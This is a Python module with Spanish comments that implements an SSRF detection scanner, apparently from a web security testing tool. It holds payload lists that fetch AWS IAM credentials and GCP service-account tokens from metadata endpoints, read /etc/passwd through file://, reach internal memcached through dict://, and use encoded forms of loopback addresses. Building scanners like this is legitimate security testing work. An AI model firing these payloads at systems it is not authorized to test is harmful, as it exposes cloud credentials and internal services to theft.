# -*- coding: utf-8 -*-
"""
Motor de detección de SSRF (Server-Side Request Forgery) y exposición de
metadatos de nube.

Técnicas soportadas:
- Acceso a endpoints de metadatos de nube (AWS, GCP, Azure, Alibaba,
  DigitalOcean) confirmado por firmas en la respuesta.
- Alcance de servicios internos / loopback (IPv4, IPv6, decimal, hexadecimal,
  octal y formas abreviadas) confirmado por diferencial contra dos canarios de
  host no resoluble.
- Esquemas peligrosos (file://) con confirmación por firma de archivo local.
- Protocol smuggling (dict://) contra servicios internos por firma.
- SSRF ciego mediante oráculo temporal contra direcciones no ruteables
  (blackhole), confirmado con petición de control y re-verificación.

Todas las firmas se evalúan sobre la respuesta con el payload reflejado
eliminado, de modo que un endpoint que simplemente devuelve la URL recibida
(reflejo) no genere un hallazgo.
"""

import re
import time
import random
import hashlib
from urllib.parse import quote, quote_plus

# Nombres de parámetro que típicamente controlan una petición del lado servidor
SSRF_PARAM_HINTS = {
    'url', 'uri', 'link', 'href', 'src', 'source', 'dest', 'destination',
    'target', 'next', 'redirect', 'redirect_uri', 'redirect_url', 'return',
    'returnurl', 'return_url', 'goto', 'callback', 'webhook', 'feed', 'proxy',
    'host', 'domain', 'site', 'origin', 'image', 'img', 'avatar', 'icon',
    'file', 'path', 'load', 'open', 'fetch', 'page', 'view', 'template',
    'service', 'endpoint', 'reference', 'ref', 'resource', 'location'
}

# Orden de prioridad cuando no se descubrieron parámetros reales en el crawl
SSRF_PARAM_PRIORITY = [
    'url', 'uri', 'redirect', 'redirect_uri', 'redirect_url', 'next',
    'target', 'dest', 'destination', 'callback', 'webhook', 'return',
    'goto', 'link', 'src', 'feed', 'proxy', 'host', 'path', 'file',
    'load', 'page', 'view', 'image', 'open'
]

# (payload, descripción, firmas esperadas en la respuesta)
CLOUD_METADATA_PAYLOADS = [
    ("http://169.254.169.254/latest/meta-data/",
     "AWS / DigitalOcean IMDSv1",
     [r"ami-id", r"instance-id", r"local-hostname", r"placement/", r"public-keys/"]),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "AWS IAM (credenciales temporales)",
     [r"AccessKeyId", r"SecretAccessKey", r"SessionToken", r"Code\s*:\s*Success"]),
    ("http://169.254.169.254/latest/user-data",
     "AWS user-data",
     [r"#cloud-config", r"#!/bin/", r"cloud-init"]),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     "Azure IMDS",
     [r"subscriptionId", r"resourceGroupName", r"azEnvironment", r"vmId"]),
    ("http://metadata.google.internal/computeMetadata/v1/",
     "GCP metadata",
     [r"instance/", r"project/", r"Metadata-Flavor"]),
    ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
     "GCP service account token",
     [r"access_token", r"expires_in", r"token_type"]),
    ("http://100.100.100.200/latest/meta-data/",
     "Alibaba Cloud metadata",
     [r"instance-id", r"region-id", r"zone-id"]),
]

# Divulgación de archivos locales por esquema file://
FILE_PAYLOADS = [
    ("file:///etc/passwd",
     "Linux (file:///etc/passwd)",
     [r"root:[x*]:0:0:"]),
    ("file:///c:/windows/win.ini",
     "Windows (file:///c:/windows/win.ini)",
     [r"\[fonts\]", r"\[extensions\]", r"\[mci extensions\]"]),
]

# Protocol smuggling contra servicios internos
PROTOCOL_PAYLOADS = [
    ("dict://127.0.0.1:11211/",
     "Memcached interno (dict://)",
     [r"^STAT ", r"^VERSION "]),
]

# Direcciones internas / loopback en múltiples representaciones
INTERNAL_TARGETS = [
    ("http://127.0.0.1/", "loopback IPv4"),
    ("http://127.0.0.1:80/", "loopback IPv4 puerto 80"),
    ("http://localhost/", "localhost"),
    ("http://[::1]/", "loopback IPv6"),
    ("http://0.0.0.0/", "0.0.0.0"),
    ("http://2130706433/", "loopback decimal"),
    ("http://0x7f000001/", "loopback hexadecimal"),
    ("http://017700000001/", "loopback octal"),
    ("http://127.1/", "loopback abreviado"),
]

# Direcciones no ruteables: si el servidor intenta conectarse, la petición cuelga
BLACKHOLE_TARGETS = [
    ("http://10.255.255.1/", "RFC1918 no ruteable"),
    ("http://192.0.2.1/", "TEST-NET-1 (RFC5737)"),
]

# Códigos que indican que un servicio interno contestó
STATUS_INTERNO_VALIDO = (200, 201, 301, 302, 401, 403)


class SSRFScanner:
    def __init__(self, session, timeout=8):
        self.session = session
        self.timeout = timeout

    @staticmethod
    def _host_invalido():
        # Longitud constante para que un simple reflejo de la URL no altere el
        # tamaño de la respuesta y dispare un falso diferencial.
        return f"http://gl-ssrf-{random.randrange(16 ** 8):08x}.invalid/"

    @staticmethod
    def _fingerprint(response):
        texto = response.text or ''
        return (
            response.status_code,
            len(texto),
            hashlib.sha256(texto.encode('utf-8', errors='ignore')).hexdigest()
        )

    @staticmethod
    def _limpiar_reflejo(texto, payload):
        """Elimina el payload reflejado (crudo y URL-encoded) antes de buscar firmas."""
        limpio = texto.replace(payload, '')
        for variante in (quote(payload, safe=''), quote_plus(payload, safe='')):
            if variante and variante != payload:
                limpio = limpio.replace(variante, '')
        return limpio

    @staticmethod
    def _firma_presente(texto, patrones):
        for patron in patrones:
            if re.search(patron, texto, re.I | re.M):
                return patron
        return None

    @staticmethod
    def _es_distinto(fp, base_fp):
        """Un fingerprint difiere de un canario por status o por tamaño significativo."""
        if fp == base_fp:
            return False
        if fp[0] != base_fp[0]:
            return True
        delta = abs(fp[1] - base_fp[1])
        return delta > 40 and (delta / max(fp[1], base_fp[1], 1)) > 0.10

    def _pedir(self, base_url, param, valor):
        return self.session.get(base_url, params={param: valor}, timeout=self.timeout)

    def scan_endpoint(self, base_url, param):
        """
        Ejecuta análisis completo de SSRF sobre un parámetro:
        1. Metadatos de nube (firma)
        2. Divulgación de archivos locales file:// (firma)
        3. Servicios internos / loopback (diferencial contra canarios)
        4. Protocol smuggling dict:// (firma)
        5. SSRF ciego por oráculo temporal (blackhole)
        """
        findings = []

        # 0. Baselines: dos canarios de host no resoluble
        baselines = []
        baseline_time = None
        for _ in range(2):
            try:
                t0 = time.perf_counter()
                resp = self._pedir(base_url, param, self._host_invalido())
                elapsed = time.perf_counter() - t0
                if baseline_time is None:
                    baseline_time = elapsed
                baselines.append(self._fingerprint(resp))
            except Exception:
                continue
        if not baselines:
            return findings

        # 1. Metadatos de nube
        for payload, desc, patrones in CLOUD_METADATA_PAYLOADS:
            try:
                resp = self._pedir(base_url, param, payload)
            except Exception:
                continue
            cuerpo = self._limpiar_reflejo(resp.text or '', payload)
            firma = self._firma_presente(cuerpo, patrones)
            if firma:
                findings.append({
                    'technique': f'Cloud Metadata ({desc})',
                    'severity': 'critica',
                    'detalle': f"Metadatos de nube accesibles a traves del parametro '{param}' ({desc}); firma '{firma}' presente en la respuesta",
                    'evidence': f"Payload: {payload} | Firma: {firma}",
                    'url': base_url,
                    'cwe': 'CWE-918'
                })
                return findings

        # 2. Divulgación de archivos locales (file://)
        for payload, desc, patrones in FILE_PAYLOADS:
            try:
                resp = self._pedir(base_url, param, payload)
            except Exception:
                continue
            cuerpo = self._limpiar_reflejo(resp.text or '', payload)
            firma = self._firma_presente(cuerpo, patrones)
            if firma:
                findings.append({
                    'technique': f'Local File Disclosure ({desc})',
                    'severity': 'critica',
                    'detalle': f"Lectura de archivo local confirmada via parametro '{param}' ({desc})",
                    'evidence': f"Payload: {payload} | Firma: {firma}",
                    'url': base_url,
                    'cwe': 'CWE-918'
                })
                return findings

        # 3. Servicios internos / loopback (diferencial)
        for payload, desc in INTERNAL_TARGETS:
            try:
                resp = self._pedir(base_url, param, payload)
            except Exception:
                continue
            if resp.status_code not in STATUS_INTERNO_VALIDO:
                continue
            fp = self._fingerprint(resp)
            if all(self._es_distinto(fp, base) for base in baselines):
                findings.append({
                    'technique': f'Internal Service Reachable ({desc})',
                    'severity': 'alta',
                    'detalle': f"El parametro '{param}' alcanza un recurso interno ({desc}); la respuesta ({resp.status_code}, {fp[1]} bytes) difiere de los canarios de host invalido",
                    'evidence': f"Payload: {payload}",
                    'url': base_url,
                    'cwe': 'CWE-918'
                })
                break

        # 4. Protocol smuggling (dict://)
        for payload, desc, patrones in PROTOCOL_PAYLOADS:
            try:
                resp = self._pedir(base_url, param, payload)
            except Exception:
                continue
            cuerpo = self._limpiar_reflejo(resp.text or '', payload)
            firma = self._firma_presente(cuerpo, patrones)
            if firma:
                findings.append({
                    'technique': f'Protocol Smuggling ({desc})',
                    'severity': 'alta',
                    'detalle': f"El parametro '{param}' alcanza un servicio interno vía esquema {desc}",
                    'evidence': f"Payload: {payload} | Firma: {firma}",
                    'url': base_url,
                    'cwe': 'CWE-918'
                })
                break

        # 5. SSRF ciego por oráculo temporal contra IP no ruteable
        base_t = baseline_time or 0.0
        umbral = max(base_t + 3.0, 5.0)
        for payload, desc in BLACKHOLE_TARGETS:
            try:
                t0 = time.perf_counter()
                self._pedir(base_url, param, payload)
                elapsed = time.perf_counter() - t0
            except Exception:
                continue
            if elapsed < umbral:
                continue

            # Control: una petición normal no debe tardar
            try:
                t_ctrl = time.perf_counter()
                self._pedir(base_url, param, 'gl_ssrf_control')
                if time.perf_counter() - t_ctrl >= 2.0:
                    continue
            except Exception:
                continue

            # Re-verificación del retardo
            try:
                t1 = time.perf_counter()
                self._pedir(base_url, param, payload)
                elapsed_confirm = time.perf_counter() - t1
            except Exception:
                continue

            if elapsed_confirm >= umbral:
                findings.append({
                    'technique': f'Time-Based Blind ({desc})',
                    'severity': 'alta',
                    'detalle': f"Retardo confirmado ({elapsed:.2f}s y {elapsed_confirm:.2f}s vs baseline {base_t:.2f}s) al forzar una conexion a {desc} via parametro '{param}' - posible SSRF ciego",
                    'evidence': f"Payload: {payload}",
                    'url': base_url,
                    'cwe': 'CWE-918'
                })
                break

        return findings
